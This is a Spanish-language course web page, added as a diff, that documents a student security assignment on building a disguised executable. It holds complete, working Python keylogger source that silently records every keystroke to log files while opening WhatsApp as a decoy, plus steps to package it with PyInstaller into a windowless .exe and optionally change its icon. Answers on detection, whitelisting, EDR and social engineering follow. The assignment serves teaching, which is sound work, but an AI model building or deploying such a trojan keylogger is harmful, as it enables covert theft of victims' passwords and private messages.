@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apaga y Vámonos — Práctica 2</title>
+  <link rel="stylesheet" href="css/styles.css">
+  <link rel="icon" type="image/png" href="img/logo.png">
+</head>
+<body>
+
+  <!-- Fondo decorativo -->
+  <div class="bg">
+    <div class="blob blob-a"></div>
+    <div class="blob blob-b"></div>
+    <div class="grid-overlay"></div>
+  </div>
+
+  <!-- Header -->
+  <header class="header" id="top">
+    <div class="container">
+      <div class="header-inner">
+        <a href="index.html" class="logo">
+          <img src="img/logo.png" alt="Apaga y Vámonos" class="logo-img">
+          <span class="logo-text">Apaga y VámonOS &mdash; Prácticas</span>
+        </a>
+        <nav class="nav">
+          <a href="index.html">Inicio</a>
+          <a href="practica1.html">Práctica 1</a>
+          <details>
+            <summary>Más prácticas</summary>
+            <div class="dropdown-panel">
+              <a href="practica2.html" class="is-active">Práctica 2</a>
+              <a href="practica3.html">Práctica 3</a>
+              <a href="practica4.html">Práctica 4</a>
+            </div>
+          </details>
+        </nav>
+        <div class="header-actions">
+          <a href="index.html" class="btn btn-ghost btn-small">Volver</a>
+          <a href="#entrega" class="btn btn-solid btn-small">Ver entrega</a>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="container">
+      <div class="hero-grid">
+        <!-- Columna izquierda -->
+        <div class="reveal">
+          <div class="kicker">
+            <span class="pill">Práctica 2</span>
+            <span class="dot"></span>
+            <span class="subpill">Seguridad de la Información</span>
+          </div>
+          <h1 class="h1">Ejecutable trampa<br>y keylogger oculto</h1>
+          <p class="lead">
+            Práctica centrada en la creación de un ejecutable aparentemente legítimo que lanza WhatsApp en primer plano mientras registra silenciosamente todas las pulsaciones de teclado en un fichero de log.
+          </p>
+          <div class="hero-cta">
+            <a href="#enunciado" class="btn btn-solid">Ver enunciado</a>
+            <a href="#valoracion" class="btn btn-ghost">Valoración</a>
+          </div>
+          <!-- Stats rápidos -->
+          <div class="stats">
+            <div class="stat">
+              <p class="stat-k">Dificultad</p>
+              <p class="stat-v">Media</p>
+            </div>
+            <div class="stat">
+              <p class="stat-k">Tecnologías</p>
+              <p class="stat-v">Python · PyInstaller · pynput</p>
+            </div>
+            <div class="stat">
+              <p class="stat-k">Estado</p>
+              <p class="stat-v">Entregada</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Columna derecha resumen rápido -->
+        <div class="reveal">
+          <div class="card">
+            <div class="card-head">
+              <p class="eyebrow">Resumen</p>
+              <span class="chip chip-green">Completada</span>
+            </div>
+            <ul class="list">
+              <li><span class="bullet"></span><span><strong>Tema:</strong> Un .exe puede parecer legítimo y actuar como malware.</span></li>
+              <li><span class="bullet"></span><span><strong>Objetivo:</strong> Crear un keylogger camuflado que abra WhatsApp y registre teclas.</span></li>
+              <li><span class="bullet"></span><span><strong>Resultado:</strong> El .exe abre WhatsApp correctamente y guarda logs en <code>teclas.log</code> y <code>RAW.txt</code>.</span></li>
+              <li><span class="bullet"></span><span><strong>Protección:</strong> Whitelisting, EDR y concienciación como medidas clave.</span></li>
+            </ul>
+            <div class="card-foot">
+              <span class="chip chip-blue">Python</span>
+              <span class="chip chip-purple">PyInstaller</span>
+              <span class="chip chip-green">Seguridad</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- Sección Enunciado -->
+  <section class="section section-soft reveal" id="enunciado">
+    <div class="container">
+      <div class="section-head">
+        <p class="eyebrow">Enunciado</p>
+        <h2 class="h2">Descripción de la práctica</h2>
+        <p class="muted">A continuación se detalla el enunciado oficial y los apartados a desarrollar.</p>
+      </div>
+      <div class="grid-2">
+        <div class="card card-hover">
+          <div class="card-head">
+            <p class="eyebrow">Parte 1</p>
+            <span class="chip chip-blue">Keylogger</span>
+          </div>
+          <h3 class="h3">Crear el script de keylogging</h3>
+          <p class="muted">Desarrollar un script en Python con <code>pynput</code> que capture todas las pulsaciones de teclado y las almacene en ficheros de log, sin interrumpir la experiencia del usuario.</p>
+          <ul class="ticks">
+            <li>Capturar teclas normales, espacios, Enter y Backspace</li>
+            <li>Guardar log formateado con timestamp en <code>teclas.log</code></li>
+            <li>Guardar log RAW (texto plano) en <code>RAW.txt</code></li>
+            <li>Gestionar borrados (Backspace) en el log RAW</li>
+          </ul>
+        </div>
+        <div class="card card-hover">
+          <div class="card-head">
+            <p class="eyebrow">Parte 2</p>
+            <span class="chip chip-purple">Ejecutable</span>
+          </div>
+          <h3 class="h3">Empaquetar como .exe legítimo</h3>
+          <p class="muted">Usar PyInstaller para convertir el script en un ejecutable que abra la aplicación real (WhatsApp) mientras el keylogger se ejecuta de fondo de forma silenciosa.</p>
+          <ul class="ticks">
+            <li>Lanzar WhatsApp con <code>subprocess.Popen</code></li>
+            <li>Compilar con PyInstaller (<code>--noconsole --onefile</code>)</li>
+            <li>Opcionalmente reemplazar el icono del .exe</li>
+            <li>Responder preguntas de análisis y reflexión</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Sección Código fuente -->
+  <section class="section reveal">
+    <div class="container">
+      <div class="section-head">
+        <p class="eyebrow">Código fuente</p>
+        <h2 class="h2">Script Python del keylogger</h2>
+        <p class="muted">El script captura teclas en segundo plano y abre WhatsApp en primer plano.</p>
+      </div>
+      <div class="card">
+        <div class="card-head">
+          <p class="eyebrow">keylog_prac_whatsapp.py</p>
+          <span class="chip chip-blue">Python</span>
+        </div>
+        <pre style="background:rgba(0,0,0,0.75);border-radius:10px;padding:1.2rem;overflow-x:auto;font-size:13px;line-height:1.6;color:#e2e8f0;"><code><span style="color:#94a3b8"># Importaciones</span>
+from pynput import keyboard
+from datetime import datetime
+import os, subprocess
+
+LOGFILE = "teclas.log"
+RAWFILE = "RAW.txt"
+
+def nowstr():
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+
+def guardarlog(texto):
+    with open(LOGFILE, "a", encoding="utf-8") as f:
+        f.write(texto + "\n")
+
+def guardarraw(texto):
+    with open(RAWFILE, "a", encoding="utf-8") as f:
+        f.write(texto)
+
+def borrarultimoraw():          <span style="color:#94a3b8"># gestiona Backspace en RAW</span>
+    try:
+        with open(RAWFILE, "rb+") as f:
+            f.seek(0, 2)
+            if f.tell() > 0:
+                f.seek(-1, 2)
+                f.truncate()
+    except: pass
+
+def on_press(key):
+    try:
+        k = key.char
+        guardarraw(k)
+    except AttributeError:
+        if   key == keyboard.Key.space:     guardarraw(" ")
+        elif key == keyboard.Key.enter:     guardarraw("\n")
+        elif key == keyboard.Key.backspace: borrarultimoraw()
+        else:
+            msg = f"tecla tecleada: {key} a las TIEMPO: {nowstr()}"
+            guardarlog(msg)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        guardarlog("Programa finalizado")
+        return False
+
+if __name__ == "__main__":
+    guardarlog("Inicio de sesión")
+    subprocess.Popen("explorer.exe ::{whatsapp}")  <span style="color:#94a3b8"># abre WhatsApp</span>
+    with keyboard.Listener(on_press=on_press,
+                           on_release=on_release) as listener:
+        listener.join()
+</code></pre>
+        <div class="card-foot">
+          <span class="chip chip-blue">pynput</span>
+          <span class="chip chip-purple">subprocess</span>
+          <span class="chip chip-green">datetime</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Sección Capturas -->
+  <section class="section reveal">
+    <div class="container">
+      <div class="section-head">
+        <p class="eyebrow">Resultados</p>
+        <h2 class="h2">Capturas del ejecutable y logs</h2>
+        <p class="muted">A continuación se muestran dos imágenes: el ejecutable generado y la ventana de WhatsApp junto a los archivos de registro. Sustituye las rutas por las tuyas.</p>
+      </div>
+      <div class="grid-2">
+        <div class="card">
+          <div class="card-head">
+            <p class="eyebrow">Archivo "application"</p>
+          </div>
+          <img src="img/p2_res2.jpeg" alt="Captura del archivo application generado" style="width:100%;border-radius:8px;">
+        </div>
+        <div class="card">
+          <div class="card-head">
+            <p class="eyebrow">WhatsApp + logs</p>
+          </div>
+          <img src="img/p2_res1.jpeg" alt="WhatsApp abierto y ficheros de log" style="width:100%;border-radius:8px;">
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Sección Entrega: Preguntas -->
+  <section class="section section-soft reveal" id="entrega">
+    <div class="container">
+      <div class="section-head">
+        <p class="eyebrow">Entrega</p>
+        <h2 class="h2">Enunciado y respuestas</h2>
+        <p class="muted">Respuestas a las preguntas de análisis de la práctica.</p>
+      </div>
+      <div class="grid-2">
+
+        <!-- a -->
+        <div class="card card-hover">
+          <div class="card-head">
+            <p class="eyebrow">Apartado a</p>
+            <span class="chip chip-blue">Detección</span>
+          </div>
+          <h3 class="h3">¿Qué señales puede dar un ejecutable sospechoso?</h3>
+          <p class="muted">Lo más fácil es fijarse en detalles visuales: que el icono no sea el de siempre, que el nombre tenga algo raro, o que la fecha de modificación sea más reciente de lo que debería. También es sospechoso que esté en el Escritorio o en <code>Downloads</code> en vez de en sus carpetas habituales. Y si encima al abrirlo no pasa nada, es una señal clara de que está mal montado.</p>
+          <div class="card-foot">
+            <span class="chip">Icono</span>
+            <span class="chip chip-purple">Ruta</span>
+            <span class="chip chip-blue">Fecha</span>
+          </div>
+        </div>
+
+        <!-- b -->
+        <div class="card card-hover">
+          <div class="card-head">
+            <p class="eyebrow">Apartado b</p>
+            <span class="chip chip-purple">Prevención</span>
+          </div>
+          <h3 class="h3">¿Cómo pueden las organizaciones evitar esto?</h3>
+          <p class="muted">Tienen varias capas: <strong>whitelisting</strong> para que solo se ejecute lo aprobado, <strong>EDR/antivirus</strong> que detectan comportamientos raros en tiempo real, y <strong>GPOs</strong> que bloquean ejecuciones desde rutas como <code>%TEMP%</code> o el escritorio. A eso se suma exigir <strong>firma digital</strong> en los ejecutables y aplicar <strong>mínimo privilegio</strong> para que un usuario normal no pueda instalar nada por su cuenta.</p>
+          <div class="card-foot">
+            <span class="chip chip-blue">Whitelist</span>
+            <span class="chip chip-purple">EDR</span>
+            <span class="chip chip-green">GPO</span>
+          </div>
+        </div>
+
+        <!-- c -->
+        <div class="card card-hover">
+          <div class="card-head">
+            <p class="eyebrow">Apartado c</p>
+            <span class="chip chip-green">Ingeniería Social</span>
+          </div>
+          <h3 class="h3">¿Qué papel juega la ingeniería social?</h3>
+          <p class="muted">Un papel clave. Abrir WhatsApp es un gesto casi automático: nadie se para a mirar en qué carpeta está ni cuándo se instaló. En un entorno familiar no sospechamos, y eso es exactamente lo que explota este tipo de ataque. Por muy buenas que sean las defensas técnicas, si el propio usuario ejecuta el archivo voluntariamente, no hay antivirus que valga.</p>
+          <div class="card-foot">
+            <span class="chip">Confianza</span>
+            <span class="chip chip-blue">Rutina</span>
+            <span class="chip chip-purple">Bypass técnico</span>
+          </div>
+        </div>
+
+        <!-- d -->
+        <div class="card card-hover">
+          <div class="card-head">
+            <p class="eyebrow">Apartado d</p>
+            <span class="chip chip-blue">Acceso físico</span>
+          </div>
+          <h3 class="h3">¿Por qué el acceso físico es tan peligroso?</h3>
+          <p class="muted">Con control directo del equipo muchas defensas pierden sentido: se puede copiar el <code>.exe</code> sin pasar por ningún firewall, meterlo en el inicio del sistema para que arranque solo, o acceder al disco entero si no está cifrado (como vimos en la Práctica 1). No hay rastro en red, no hay alerta de acceso remoto. Por eso en seguridad se dice: quien tiene acceso físico, tiene el equipo.</p>
+          <div class="card-foot">
+            <span class="chip chip-purple">Persistencia</span>
+            <span class="chip chip-blue">Sin rastro</span>
+            <span class="chip chip-green">Disco expuesto</span>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Callout -->
+      <div class="callout" style="margin-top:2rem;">
+        <p><strong>Integrantes:</strong> Eneko Álvarez, Maialen Blanco</p>
+        <div class="callout-actions">
+          <a href="#" class="btn btn-solid btn-small">Ver en GitHub</a>
+          <a href="#" class="btn btn-ghost btn-small">Descargar ZIP</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- Sección Checklist -->
+  <section class="section section-soft reveal">
+    <div class="container">
+      <div class="section-head">
+        <p class="eyebrow">Criterios</p>
+        <h2 class="h2">Checklist de evaluación</h2>
+        <p class="muted">Puntos clave que se comprueban en esta práctica.</p>
+      </div>
+      <div class="grid-2">
+        <div class="card">
+          <ul class="checklist">
+            <li class="check"><input type="checkbox" checked><span><strong>Keylogger funcional:</strong> captura teclas normales, especiales y gestiona Backspace correctamente.</span></li>
+            <li class="check"><input type="checkbox" checked><span><strong>Doble log:</strong> se generan <code>teclas.log</code> (con timestamps) y <code>RAW.txt</code> (texto limpio).</span></li>
+            <li class="check"><input type="checkbox" checked><span><strong>Ejecución de WhatsApp:</strong> el .exe abre la app real sin levantar sospechas visuales.</span></li>
+            <li class="check"><input type="checkbox" checked><span><strong>Empaquetado .exe:</strong> compilado con PyInstaller en modo <code>--noconsole --onefile</code>.</span></li>
+            <li class="check"><input type="checkbox" checked><span><strong>Preguntas respondidas:</strong> apartados a–d completados con análisis técnico y reflexión.</span></li>
+          </ul>
+        </div>
+        <div class="card">
+          <p class="eyebrow">Conceptos y tecnología</p>
+          <div class="tags" style="margin-top:12px;">
+            <span class="tag">Python 3</span>
+            <span class="tag">pynput</span>
+            <span class="tag">PyInstaller</span>
+            <span class="tag">subprocess</span>
+            <span class="tag">Keylogger</span>
+            <span class="tag">Ingeniería Social</span>
+            <span class="tag">Whitelisting</span>
+            <span class="tag">EDR</span>
+            <span class="tag">Acceso físico</span>
+          </div>
+          <div class="note">
+            <p class="muted" style="font-size:13px;margin:0;">
+              Idea principal: un ejecutable legítimo de apariencia puede ocultar código malicioso.
+              La única defensa completa combina <strong>medidas técnicas</strong> (whitelist, EDR, GPO) con <strong>concienciación</strong> del usuario frente a la ingeniería social.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Sección Valoración -->
+  <section class="section reveal" id="valoracion">
+    <div class="container">
+      <div class="section-head">
+        <p class="eyebrow">Reflexión</p>
+        <h2 class="h2">Valoración personal</h2>
+      </div>
+      <div class="grid-2">
+        <div class="card card-hover">
+          <div class="card-head">
+            <h3 class="h3">⚡ Utilidad real</h3>
+            <span class="chip chip-green">Alta</span>
+          </div>
+          <p class="muted">
+            Esta práctica demuestra de forma muy directa cómo un atacante puede <strong>capturar contraseñas, mensajes y datos sensibles</strong> simplemente consiguiendo que la víctima ejecute un archivo disfrazado de app conocida. La combinación de ingeniería social y un ejecutable bien construido es extremadamente efectiva.
+          </p>
+        </div>
+        <div class="card card-hover">
+          <div class="card-head">
+            <h3 class="h3">🔧 Dificultad</h3>
+            <span class="chip chip-blue">Media</span>
+          </div>
+          <p class="muted">
+            La parte más delicada fue lograr que el .exe abriera WhatsApp correctamente y que el keylogger funcionase en segundo plano sin ventana de consola visible. El empaquetado con PyInstaller requiere atención a las rutas de los ficheros de log generados.
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="section">
+    <div class="container">
+      <div class="footer">
+        <p class="muted" style="font-size:13px;margin:0;">
+          Práctica 2 &mdash; Desarrollo Web 2025&ndash;2026 &nbsp;&nbsp;
+          <a href="index.html" class="link">Volver al inicio</a>
+        </p>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Script scroll reveal + header scrolled + nav activo -->
+  <script>
+    // Reveal on scroll
+    const reveals = document.querySelectorAll('.reveal');
+    const io = new IntersectionObserver(entries => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          e.target.classList.add('in');
+          io.unobserve(e.target);
+        }
+      });
+    }, { threshold: 0.1 });
+    reveals.forEach(el => io.observe(el));
+
+    // Header scrolled
+    const header = document.querySelector('.header');
+    window.addEventListener('scroll', () => {
+      header.classList.toggle('is-scrolled', window.scrollY > 10);
+    });
+  </script>
+
+</body>
+</html>
